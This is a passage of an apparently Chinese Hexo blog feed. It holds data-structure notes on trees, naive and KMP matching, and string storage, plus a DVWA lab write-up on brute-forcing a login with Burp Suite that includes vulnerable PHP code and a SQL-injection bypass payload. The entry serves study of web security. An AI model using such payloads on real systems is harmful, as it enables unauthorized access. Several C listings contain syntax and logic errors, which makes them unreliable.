<p><strong>树是一种递归定义的数据结构</strong></p>
<h3 id="节点之间的路径"><a href="#节点之间的路径" class="headerlink" title="节点之间的路径"></a>节点之间的路径</h3><p>路径是单向的，只能从上往下</p>
<h3 id="路径长度"><a href="#路径长度" class="headerlink" title="路径长度"></a>路径长度</h3><p>经过几条边</p>
<h3 id="结点，树的属性描述"><a href="#结点，树的属性描述" class="headerlink" title="结点，树的属性描述"></a>结点，树的属性描述</h3><p>结点的层次（深度）——从上往下数<br>结点的高度——从下往上数<br>树的高度（深度）——总共多少层<br>结点的度——有几个孩子（分支）<br>树的度——各结点的度的最大值<br>默认从一开始</p>
<h2 id="有序树vs无序树"><a href="#有序树vs无序树" class="headerlink" title="有序树vs无序树"></a>有序树vs无序树</h2><p><img src="/2022/08/16/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97/image-20220629123151781.png" alt></p>
<h2 id="森林"><a href="#森林" class="headerlink" title="森林"></a>森林</h2><p>森林是m棵互不相交的树的集合（m可为0，表示空森林）</p>
<h2 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h2><p>结点数=总度数+1<br><img src="/2022/08/16/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97/image-20220701140810203.png" alt><br><img src="/2022/08/16/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97/image-20220701140849174.png" alt><br><img src="/2022/08/16/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97/image-20220701140928499.png" alt><br><img src="/2022/08/16/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97/image-20220701141014648.png" alt><br><img src="/2022/08/16/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97/image-20220701141202675.png" alt></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>树与二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>朴素模式匹配算法和KPM算法</title>
    <url>/2022/08/16/%E6%9C%B4%E7%B4%A0%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95%E5%92%8CKPM%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>朴素模式匹配算法的代码实现和KMP以及其中next数组的求法</p>
<span id="more"></span>
<h2 id="朴素模式匹配算法"><a href="#朴素模式匹配算法" class="headerlink" title="朴素模式匹配算法"></a>朴素模式匹配算法</h2><p>字符串模式匹配：在主串中找到域模式串相同的子串，并返回其所在位置</p>
<p>子串：主串的一部分</p>
<p>模式串：不一定能在主串中找到</p>
<p>(暴力破解（穷举）)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Index</span><span class="params">(SString S,SString T)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1.</span>j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=S.length &amp;&amp; j&lt;=T.length)&#123;</span><br><span class="line">        <span class="keyword">if</span>(S.ch[i]==T.ch[j])&#123;</span><br><span class="line">            i++;j++;            <span class="comment">//继续比较后续字符</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            i=i-j+<span class="number">2</span>;</span><br><span class="line">            j=<span class="number">1</span>;                <span class="comment">//指针后退重新开始匹配</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j&gt;T.length)</span><br><span class="line">        <span class="keyword">return</span> i-T.length;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主串长度为n</p>
<p>模式串长度为m</p>
<p>最好时间复杂度=O(n)</p>
<p>最坏时间复杂度=O((n-m+1)m)=O(nm)</p>
<h2 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h2><p>基于朴素模式算法优化而来</p>
<p><img src="/2022/08/16/%E6%9C%B4%E7%B4%A0%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95%E5%92%8CKPM%E7%AE%97%E6%B3%95/image-20220604181601977.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (S[i]!=T[j])</span><br><span class="line">    j=next[j];</span><br><span class="line"><span class="keyword">if</span>(j==<span class="number">0</span>)&#123;</span><br><span class="line">	i++;</span><br><span class="line">	j++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据模式串T，求出next数组——&gt;利用next数据进行匹配（主指针不回溯）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Index_KMP</span><span class="params">(SString S,SString T,<span class="type">int</span> next[])</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1.</span>j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=S.length &amp;&amp; j&lt;=T.length)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">0</span> || S.ch[i]==T.ch[j ])&#123;</span><br><span class="line">            i++;j++;            <span class="comment">//继续比较后续字符</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            j=next[j];          <span class="comment">//主串指针i不回溯，模式串向右移动，KMP算法核心</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j&gt;T.length)</span><br><span class="line">        <span class="keyword">return</span> i-T.length;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最坏时间复杂度：O(m+n)     求next数组的时间复杂度O(m)模式匹配时间复杂度O(n)</p>
<h2 id="求next数组"><a href="#求next数组" class="headerlink" title="求next数组"></a><strong>求next数组</strong></h2><p>任何模式串都一样</p>
<p>第一个字符不匹配时，next[1]=0</p>
<p>第二个字符不匹配时，next[2]=1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_next</span><span class="params">(SString S,SString T,<span class="type">int</span> *next)</span>&#123;</span><br><span class="line">    next[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    next[<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line">    length=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">3</span>;i&lt;=T.length;i++)&#123;</span><br><span class="line">        <span class="type">int</span> j=i;</span><br><span class="line">        <span class="keyword">while</span>(j&gt;<span class="number">2</span> &amp;&amp; T.ch[i<span class="number">-1</span>]!=T.ch[j<span class="number">-2</span>])&#123;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(T.ch[i<span class="number">-1</span>]=T.ch[j<span class="number">-1</span>])&#123;</span><br><span class="line">            length++;</span><br><span class="line">            i--,j--;</span><br><span class="line">        &#125;</span><br><span class="line">        next[i]=length+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>串，算法</tag>
      </tags>
  </entry>
  <entry>
    <title>暴力破解</title>
    <url>/2022/08/16/force/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>暴力破解或称为穷举法，是一种针对于密码的破译方法，即将密码进行逐个推算直到找出真正的密码为止。例如一个已知是四位并且全部由数字组成的密码，其可能共有10000种组合，因此最多尝试10000次就能找到正确的密码。理论上利用这种方法可以破解任何一种密码，问题只在于如何缩短试误时间。有些人运用计算机来增加效率，有些人辅以字典来缩小密码组合的范围</p>
<span id="more"></span>
<h2 id="burp-suite-攻击模式"><a href="#burp-suite-攻击模式" class="headerlink" title="burp suite 攻击模式"></a>burp suite 攻击模式</h2><p>Sniper:对变量一次进行破解，多个标记依次进行。（俗话简单来说就是，用户名和密码用的是一套字典，破解的时候也只是导入一个字典，但是它会根据先破解用户名，破解出来以后急需破解密码这样的顺序，对于简单的用户名密码字典数目少的可以考虑）</p>
<p>Battering ram:对变量同时进行破解，多个标记同时进行。（这个也是只有一个字典但区别是，可以同时进行，就是先破解用户名破解完了继续破解密码，相比遇上一个速度更快）</p>
<p>Pitchfork:每一个变量标记对应一个字典，取每个字典的对应项。（这个意思就是，每个变量一个字典，破解的时候每个字典的一号对应另一个字典的一号进行破解，这样破解对于那些一一对应的用户名密码来说速度很快，但很明显我们没办法准确的定位用户名和密码，显然不适用于每个情况）</p>
<p>Cluster bomb：每个变量对应一个字典，并且进行交际破解，尝试各种组合，适合于用户名加密码破解。（这种情况就是普罗大众很容易明白理解的情况就是多个字典进行笛卡尔积，依次破解，这种就会有多种组合，时间上也是一个问题，当然对于需要用时很长的，我们可以添加进程，用来适量缩短时间）</p>
<h2 id="安全性low"><a href="#安全性low" class="headerlink" title="安全性low"></a>安全性low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );   <span class="comment">//进行一个md5加密</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;    <span class="comment">//存在sql注入</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false。查看源码可以看到采用get方式进行传值。<br>通过if语句看到服务器只验证了参数login是否被设置，没有任何的防爆破机制。<br>存在sql注入漏洞admin‘ or ’1‘=’1</p>
<p><img src="/2022/08/16/force/image-20220816155701955.png" alt><br>进行爆破<br><img src="/2022/08/16/force/image-20220816160817937.png" alt><br>可以看到用户名为admin与密码为password是报文长度不一样<br><img src="/2022/08/16/force/image-20220816160905106.png" alt><br>最终得到结果</p>
<h3 id="通过sql注入的方式"><a href="#通过sql注入的方式" class="headerlink" title="通过sql注入的方式"></a>通过sql注入的方式</h3><p><img src="/2022/08/16/force/image-20220816161358979.png" alt><br>即输入?username=admin’ or ‘1’=’1 也可以通过sql注入方式成功登录</p>
<h2 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h2><p>相比于low安全级主要多了以下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br></pre></td></tr></table></figure>
<p>主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，“， x1a) 进行转义，基本上能够抵御sql注入攻击，同时$pass做了md5校验，杜绝了通过参数password进行sql注入的问题，但是依然没有采用有效的防爆破机制。</p>
<p>方法和low难度一样，炸就完事</p>
<h2 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h2><p>源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="title function_ invoke__">sleep</span>( <span class="title function_ invoke__">rand</span>( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>代码加入了token，可以抵御CSRF攻击，同时增加了爆破的难度，登陆验证时提交了四个参数<br>token的目的是为了减轻服务器压力，减少频繁的查询数据库，使服务器更加健壮。</p>
<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>同样随便输抓个包看一下<br><img src="/2022/08/16/force/image-20220816163602836.png" style="zoom:67%;"><br>返回了个<img src="/2022/08/16/force/image-20220816165137129.png" alt></p>
<p>我们可以看到他同时提交了四个参数usename,password,login,user_token<br><img src="/2022/08/16/force/image-20220816163704341.png" alt><br>爆破走起，参数调整准备轰炸（为了节约时间没有导入大数据字典)<br><img src="/2022/08/16/force/image-20220817100950217.png" alt><br><img src="/2022/08/16/force/image-20220817101005531.png" alt><br>此处一串符号为options中gerp-extract选入的token值<br><img src="/2022/08/16/force/image-20220817101118814.png" alt><br>上下文不照是因为又开了一个三位爆破的进程在运行笛卡尔积情况下的爆破，所以是一个新的请求位置就是这个位置。<br>找最与众不同的那个<br><img src="/2022/08/16/force/image-20220817101411420.png" alt><br><img src="/2022/08/16/force/image-20220817101438555.png" alt><br>成功登录</p>
<h2 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h2><p>相比于high级别主要多了以下代码<br><img src="/2022/08/16/force/image-20220817102357929.png" alt><br>每登陆失败三次就要等15s钟<br><img src="/2022/08/16/force/image-20220817102441140.png" alt><br><img src="/2022/08/16/force/image-20220817102505788.png" alt><br><img src="/2022/08/16/force/image-20220817102543236.png" alt><br><img src="/2022/08/16/force/image-20220817102602350.png" alt><br>采用了更为安全的PDO机制防御sql注入</p>
]]></content>
      <categories>
        <category>web攻防</category>
      </categories>
      <tags>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title>串的存储结构</title>
    <url>/2022/08/15/%E4%B8%B2%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>串的顺序存储、链式存储的代码实现和基本操作的代码实现</p>
<span id="more"></span>
<h2 id="串的存储结构"><a href="#串的存储结构" class="headerlink" title="串的存储结构"></a>串的存储结构</h2><h3 id="串的顺序存储"><a href="#串的顺序存储" class="headerlink" title="串的顺序存储"></a>串的顺序存储</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXLEN 255     <span class="comment">//预定义最大串长为255</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> ch[MAXLEN];   <span class="comment">//每个分类存储一个字符</span></span><br><span class="line">    <span class="type">int</span> length;        <span class="comment">//串的实际长度</span></span><br><span class="line">&#125;SString;<span class="comment">//静态数组实现（定长顺序存储）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *ch;          <span class="comment">//按串长分配存储区，ch指向串的基地址</span></span><br><span class="line">    <span class="type">int</span> length;        <span class="comment">//串的长度</span></span><br><span class="line">&#125;HString;<span class="comment">//动态数组实现（堆分配存储）</span></span><br><span class="line">HString S;</span><br><span class="line">S.ch = (<span class="type">char</span> *)<span class="built_in">malloc</span>(MAXLEN*<span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">S.length=<span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>优点：随机存取</p>
<p>缺点：插入删除操作不方便</p>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/image-20220604165848221.png" alt></p>
<p>方案一：需要额外一片空间</p>
<p>方案二：length只占1B即8bit所以数组不能超过255</p>
<p>方案三：每次求表长都需要遍历整个字符串</p>
<h3 id="串的链式存储"><a href="#串的链式存储" class="headerlink" title="串的链式存储"></a>串的链式存储</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> ch;                      <span class="comment">//每个结点存一个字符</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125;StringNode, *String;             <span class="comment">//存储密度低，每个字节1B，每个指针4B</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">//改良</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> ch[<span class="number">4</span>];                   <span class="comment">//每个结点存多个字符</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125;StringNode, *String;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/image-20220604171058073.png" alt><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/image-20220604171107252.png" alt></p>
<h3 id="基本操作的实现"><a href="#基本操作的实现" class="headerlink" title="基本操作的实现"></a>基本操作的实现</h3><h4 id="求子串"><a href="#求子串" class="headerlink" title="求子串"></a>求子串</h4><p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/image-20220604172524171.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">SubString</span><span class="params">(SString &amp;Sub,SString S,<span class="type">int</span> pos,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="comment">//子串范围越界</span></span><br><span class="line">    <span class="keyword">if</span>(pos+len<span class="number">-1</span>&gt;S.length)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=pos;i&lt;len+pos;i++)</span><br><span class="line">        Sub.ch[i-pos+<span class="number">1</span>]=S.ch[i];</span><br><span class="line">    Sub.length=len;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="比较两个串的大小"><a href="#比较两个串的大小" class="headerlink" title="比较两个串的大小"></a>比较两个串的大小</h4><p><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/Users\18251\AppData\Roaming\Typora\typora-user-images\image-20220604172617169.png" style="zoom:67%;"><img src="/2022/08/15/%E4%B8%B2%E7%9A%84%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/image-20220604172621936.png" style="zoom:67%;"></p>
